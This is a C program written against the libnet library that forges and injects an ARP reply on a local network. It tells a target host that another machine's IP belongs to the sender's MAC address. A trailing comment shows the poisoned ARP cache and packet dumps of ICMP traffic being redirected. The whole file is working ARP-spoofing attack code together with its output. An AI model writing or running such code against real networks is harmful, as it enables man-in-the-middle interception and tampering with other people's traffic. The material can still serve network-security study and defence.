#include <libnet.h>
/* 192.168.1.10  at  00:01:03:1D:98:B8 */
/* 192.168.1.100 at  08:00:46:07:04:A3 */
/* 192.168.1.30  at  00:30:C1:AD:63:D1 */

u_char enet_dst[6] = {0x00, 0x01, 0x03, 0x1d, 0x98, 0xB8};
u_char enet_src[6] = {0x08, 0x00, 0x46, 0x07, 0x04, 0xA3};

int main(int argc, char *argv[]) {
    int packet_size, c;                 /* size of our packet */
    u_long spf_ip = 0, dst_ip = 0;      /* spoofed ip, dest ip */
    u_char *packet;                     /* pointer to our packet buffer */
    char err_buf[LIBNET_ERRBUF_SIZE];   /* error buffer */
    struct libnet_link_int *network;    /* pointer to link interface struct */

    dst_ip = libnet_name_resolve("192.168.1.10", LIBNET_DONT_RESOLVE);
    spf_ip = libnet_name_resolve("192.168.1.30", LIBNET_DONT_RESOLVE);

    /* Step 1: Memory Initialization */

    /* We're going to build an ARP reply */
    packet_size = LIBNET_ETH_H + LIBNET_ARP_H + 30;
    libnet_init_packet(packet_size, &packet);

    /* Step 2: Network initialization */
    network = libnet_open_link_interface("eth0", err_buf);

    /* Step 3: Packet construction (ethernet header). */
    libnet_build_ethernet(enet_dst,
			  enet_src,
			  ETHERTYPE_ARP,
			  NULL,
			  0,
			  packet);
    libnet_build_arp(ARPHRD_ETHER, 
		     0x0800, /* IP proto */
		     6, /* Ether addr len */
		     4, /* IP addr len */
		     ARPOP_REPLY, /* ARP reply */
		     enet_src, /* our ether */ 
		     (u_char *)&spf_ip,  /* spoofed ip */
		     enet_dst, 
		     (u_char *)&dst_ip,          
		     NULL, 
		     0, 
		     packet + LIBNET_ETH_H); 
  
    /* Step 5: Packet injection */
    c = libnet_write_link_layer(network, "eth0", packet, packet_size);
    if (c < packet_size)
    {
        libnet_error(LN_ERR_WARNING, "libnet_write_link_layer only wrote %d bytes\n", c);
    }
    else
    {
        printf("construction and injection completed, wrote all %d bytes\n", c);
    }


    /* Shut down the interface */
    libnet_close_link_interface(network);
    /* Free packet memory */
    libnet_destroy_packet(&packet);

    return 0;
}

/*
# arp -a

(192.168.1.30) at 00:30:C1:AD:63:D1 [ether] on eth0

8:0:46:7:4:a3 0:1:3:1d:98:b8 0806 72: arp reply 192.168.1.30 is-at 8:0:46:7:4:a3
                         0001 0800 0604 0002 0800 4607 04a3 c0a8
                         011e 0001 031d 98b8 c0a8 010a 0000 0000
                         0000 0000 0000 0000 0000 0000 0000 0000
                         0000 0000 0000

(192.168.1.30) at 08:00:46:07:04:A3 [ether] on eth0


0:1:3:1d:98:b8 8:0:46:7:4:a3 0800 74: 192.168.1.10 > 192.168.1.30: icmp: echo request
                         4500 003c 4903 0000 2001 ce45 c0a8 010a
                         c0a8 011e 0800 495c 0300 0100 6162 6364
                         6566 6768 696a 6b6c 6d6e 6f70 7172 7374
                         7576 7761 6263


*/
